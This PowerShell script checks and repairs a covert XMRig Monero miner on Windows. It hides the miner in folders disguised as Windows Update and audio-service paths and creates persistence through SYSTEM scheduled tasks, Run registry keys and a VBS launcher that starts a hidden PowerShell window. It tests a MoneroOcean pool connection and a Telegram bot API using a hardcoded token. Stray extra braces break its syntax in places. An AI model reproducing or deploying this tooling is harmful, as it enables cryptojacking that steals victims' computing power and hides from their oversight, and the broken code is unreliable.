# Universal Miner Status Checker
# Fixed version with proper syntax and comprehensive checks

param(
    [switch]$Fix,
    [switch]$Install,
    [switch]$Repair
)

$ErrorActionPreference = "SilentlyContinue"

function Write-StatusLog {
    param([string]$Message, [string]$Status = "INFO")
    $color = switch ($Status) {
        "OK" { "Green" }
        "WARN" { "Yellow" }
        "ERROR" { "Red" }
        "INFO" { "Cyan" }
        default { "White" }
    }
    Write-Host $Message -ForegroundColor $color
}

function Test-ProcessRunning {
    Write-Host "`n[1] Checking XMRig Process..." -ForegroundColor Yellow
    
    $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    if ($processes) {
        Write-StatusLog "✓ XMRig is running - PID(s): $($processes.Id -join ', ')" "OK"
        return $true
    } else {
        Write-StatusLog "✗ XMRig is NOT running" "WARN"
        return $false
    }
}

function Test-ProcessCount {
    Write-Host "`n[2] Checking Process Count..." -ForegroundColor Yellow
    
    $processes = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    $count = $processes.Count
    
    if ($count -eq 0) {
        Write-StatusLog "✗ No processes running" "WARN"
    } elseif ($count -eq 1) {
        Write-StatusLog "✓ Single instance running (optimal)" "OK"
    } else {
        Write-StatusLog "⚠ Multiple instances detected: $count (may cause conflicts)" "WARN"
    }
    
    return $count
}

function Test-DeploymentLocations {
    Write-Host "`n[3] Checking Deployment Locations..." -ForegroundColor Yellow
    
    $locations = @(
        "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
        "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv",
        "C:\ProgramData\Microsoft\Network\Downloader",
        "C:\ProgramData\WindowsUpdater"  # V1 compatibility
    )
    
    $validLocations = 0
    $totalLocations = $locations.Count
    
    foreach ($location in $locations) {
        $xmrigPath = Join-Path $location "xmrig.exe"
        $configPath = Join-Path $location "config.json"
        
        if ((Test-Path $xmrigPath) -and (Test-Path $configPath)) {
            Write-StatusLog "   ✓ $location - Complete installation" "OK"
            $validLocations++
        } elseif (Test-Path $location) {
            Write-StatusLog "   ⚠ $location - Partial installation" "WARN"
        } else {
            Write-StatusLog "   ✗ $location - Missing" "ERROR"
        }
    }
    
    Write-Host "   Total locations: $validLocations/$totalLocations main locations" -ForegroundColor Cyan
    return $validLocations
}

function Test-ScheduledTasks {
    Write-Host "`n[4] Checking Scheduled Tasks..." -ForegroundColor Yellow
    
    $taskNames = @(
        "WindowsAudioSrv", "SystemHostAudio", "AudioEndpointSrv", 
        "UniversalMiner", "WindowsAudioService", "BeastModeCC",
        "WinUpdSvc"  # V1 compatibility
    )
    
    $activeTasks = 0
    foreach ($taskName in $taskNames) {
        try {
            $task = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
            if ($task) {
                $state = $task.State
                if ($state -eq "Ready" -or $state -eq "Running") {
                    Write-StatusLog "   ✓ $taskName - $state" "OK"
                    $activeTasks++
                } else {
                    Write-StatusLog "   ⚠ $taskName - $state" "WARN"
                }
            }
        } catch { 
            # Ignore task check errors
        }
    }
    
    if ($activeTasks -eq 0) {
        Write-StatusLog "✗ No active startup tasks found" "ERROR"
    } else {
        Write-StatusLog "✓ $activeTasks active startup tasks found" "OK"
    }
    
    return $activeTasks
}

function Test-RegistryEntries {
    Write-Host "`n[5] Checking Registry Entries..." -ForegroundColor Yellow
    
    $regLocations = @(
        @{ Path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; Name = "UniversalAudioService" },
        @{ Path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; Name = "WindowsAudioService" },
        @{ Path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; Name = "AudioEndpointBuilder" }
    )
    
    $foundEntries = 0
    foreach ($reg in $regLocations) {
        try {
            $value = Get-ItemProperty -Path $reg.Path -Name $reg.Name -ErrorAction SilentlyContinue
            if ($value) {
                Write-StatusLog "   ✓ $($reg.Path)\$($reg.Name)" "OK"
                $foundEntries++
            }
        } catch { 
            # Ignore registry check errors
        }
    }
    
    if ($foundEntries -eq 0) {
        Write-StatusLog "✗ No registry startup entries found" "ERROR"
    } else {
        Write-StatusLog "✓ $foundEntries registry startup entries found" "OK"
    }
    
    return $foundEntries
}

function Test-APIConnection {
    Write-Host "`n[6] Checking API Connection..." -ForegroundColor Yellow
    
    try {
        $response = Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/summary" -TimeoutSec 3
        if ($response) {
            $hashrate = if ($response.hashrate.total -and $response.hashrate.total[0]) { 
                [math]::Round($response.hashrate.total[0], 0) 
            } else { 0 }
            
            Write-StatusLog "✓ API accessible - Hashrate: $hashrate H/s" "OK"
            return $true
        }
    } catch {
        Write-StatusLog "✗ API not accessible (miner may not be running)" "WARN"
        return $false
    }
}
}

function Test-SystemMetrics {
    Write-Host "`n[7] Checking CPU Usage..." -ForegroundColor Yellow
    
    try {
        # Fixed PowerShell syntax
        $cpuCounter = Get-Counter "\Processor(_Total)\% Processor Time" -SampleInterval 1 -MaxSamples 1 -ErrorAction SilentlyContinue
        if ($cpuCounter) {
            $cpuUsage = [math]::Round($cpuCounter.CounterSamples[0].CookedValue, 1)
            
            if ($cpuUsage -lt 50) {
                Write-StatusLog "✓ CPU Usage: $cpuUsage% (Low)" "OK"
            } elseif ($cpuUsage -lt 85) {
                Write-StatusLog "✓ CPU Usage: $cpuUsage% (Normal)" "OK"
            } else {
                Write-StatusLog "⚠ CPU Usage: $cpuUsage% (High - may cause lag)" "WARN"
            }
        } else {
            Write-StatusLog "⚠ Could not measure CPU usage" "WARN"
        }
        
        # Memory check
        $memory = Get-WmiObject Win32_ComputerSystem
        $totalRAM = [math]::Round($memory.TotalPhysicalMemory / 1GB, 1)
        $availableMemory = Get-Counter "\Memory\Available MBytes" -ErrorAction SilentlyContinue
        
        if ($availableMemory) {
            $availableGB = [math]::Round($availableMemory.CounterSamples[0].CookedValue / 1024, 1)
            Write-StatusLog "✓ RAM: $availableGB GB available of $totalRAM GB total" "OK"
        }
        
    } catch {
        Write-StatusLog "✗ System metrics check failed: $($_.Exception.Message)" "ERROR"
    }
}

function Test-NetworkConnectivity {
    Write-Host "`n[8] Checking Network Connectivity..." -ForegroundColor Yellow
    
    try {
        # Test pool connection
        $poolHost = "gulf.moneroocean.stream"
        $poolPort = 10128
        
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.ReceiveTimeout = 3000
        $tcpClient.SendTimeout = 3000
        
        $tcpClient.Connect($poolHost, $poolPort)
        if ($tcpClient.Connected) {
            Write-StatusLog "✓ Pool connection: $poolHost`:$poolPort accessible" "OK"
            $tcpClient.Close()
        }
        
        # Test Telegram API
        $telegramTest = Invoke-RestMethod -Uri "https://api.telegram.org/bot7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE/getMe" -TimeoutSec 5 -ErrorAction SilentlyContinue
        if ($telegramTest.ok) {
            Write-StatusLog "✓ Telegram API accessible" "OK"
        } else {
            Write-StatusLog "⚠ Telegram API not accessible" "WARN"
        }
        
    } catch {
        Write-StatusLog "⚠ Network connectivity issues detected" "WARN"
    }
}
}

function Repair-Installation {
    Write-Host "`n🔧 REPAIRING INSTALLATION..." -ForegroundColor Green
    
    $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
    
    # Fix deployment locations
    Write-Host "Fixing deployment locations..." -ForegroundColor Yellow
    powershell -ExecutionPolicy Bypass -Command "& '$scriptDir\universal_miner_manager.ps1' -Install"
    
    # Fix performance issues
    Write-Host "Applying performance fixes..." -ForegroundColor Yellow
    powershell -ExecutionPolicy Bypass -Command "& '$scriptDir\performance_optimizer.ps1' -Install"
    
    # Fix scheduled tasks
    Write-Host "Repairing scheduled tasks..." -ForegroundColor Yellow
    $locations = @(
        "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
        "C:\ProgramData\WindowsUpdater"
    )
    
    foreach ($location in $locations) {
        if (Test-Path $location) {
            # Create VBS launcher
            $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& '$scriptDir\universal_miner_manager.ps1' -Monitor""", 0, False
"@
            $vbsContent | Set-Content -Path "$location\universal_monitor.vbs" -Encoding UTF8
            
            # Create scheduled tasks
            $taskNames = @("WindowsAudioService", "UniversalMiner", "SystemAudioHost")
            foreach ($taskName in $taskNames) {
                schtasks /create /tn $taskName /tr "wscript.exe `"$location\universal_monitor.vbs`"" /sc onstart /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
            }
        }
    }
    
    # Fix registry entries
    Write-Host "Fixing registry entries..." -ForegroundColor Yellow
    $regEntries = @(
        @{ Path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"; Name = "UniversalAudioService"; Value = "wscript.exe `"C:\ProgramData\Microsoft\Windows\WindowsUpdate\universal_monitor.vbs`"" }
    )
    
    foreach ($entry in $regEntries) {
        try {
            Set-ItemProperty -Path $entry.Path -Name $entry.Name -Value $entry.Value -Force
            Write-StatusLog "✓ Fixed registry entry: $($entry.Name)" "OK"
        } catch {
            Write-StatusLog "✗ Failed to fix registry entry: $($entry.Name)" "ERROR"
        }
    }
    
    Write-Host "`n✅ REPAIR COMPLETED" -ForegroundColor Green
}

function Show-Summary {
    param([hashtable]$Results)
    
    Write-Host "`n" + "="*60 -ForegroundColor Cyan
    Write-Host "   SYSTEM STATUS SUMMARY" -ForegroundColor Cyan
    Write-Host "="*60 -ForegroundColor Cyan
    
    $totalIssues = 0
    
    if (-not $Results.ProcessRunning) { 
        Write-StatusLog "⚠ Miner not running (expected if not started)" "WARN"
    }
    
    if ($Results.ValidLocations -eq 0) {
        Write-StatusLog "❌ No valid deployment locations found" "ERROR"
        $totalIssues++
    }
    
    if ($Results.ActiveTasks -eq 0) {
        Write-StatusLog "❌ No startup tasks configured" "ERROR"
        $totalIssues++
    }
    
    if ($Results.RegistryEntries -eq 0) {
        Write-StatusLog "❌ No registry startup entries" "ERROR"
        $totalIssues++
    }
    
    if ($totalIssues -eq 0) {
        Write-StatusLog "`n🎉 SYSTEM IS PROPERLY CONFIGURED!" "OK"
        Write-StatusLog "   Ready to start mining when needed" "OK"
    } else {
        Write-StatusLog "`n🔧 $totalIssues ISSUES FOUND" "WARN"
        Write-StatusLog "   Run with -Repair to fix automatically" "WARN"
    }
}

# Main execution
Write-Host "=====================================================" -ForegroundColor Cyan
Write-Host "   UNIVERSAL MINER STATUS CHECK" -ForegroundColor Cyan  
Write-Host "=====================================================" -ForegroundColor Cyan

$results = @{}

# Run all checks
$results.ProcessRunning = Test-ProcessRunning
$results.ProcessCount = Test-ProcessCount
$results.ValidLocations = Test-DeploymentLocations
$results.ActiveTasks = Test-ScheduledTasks
$results.RegistryEntries = Test-RegistryEntries
$results.APIAccessible = Test-APIConnection
Test-SystemMetrics
Test-NetworkConnectivity

# Handle repair if requested
if ($Repair -or $Fix) {
    Repair-Installation
    Write-Host "`nRe-running status check..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    
    # Re-run key checks
    $results.ValidLocations = Test-DeploymentLocations
    $results.ActiveTasks = Test-ScheduledTasks  
    $results.RegistryEntries = Test-RegistryEntries
}

# Show summary
Show-Summary -Results $results

Write-Host "`n💡 QUICK FIXES:" -ForegroundColor Yellow
Write-Host "   • To repair everything: .\status_checker.ps1 -Repair" -ForegroundColor White
Write-Host "   • To start mining: .\UNIVERSAL_LAUNCHER.bat (as admin)" -ForegroundColor White
Write-Host "   • For full deployment: Choose Option 1, 6, or 7" -ForegroundColor White
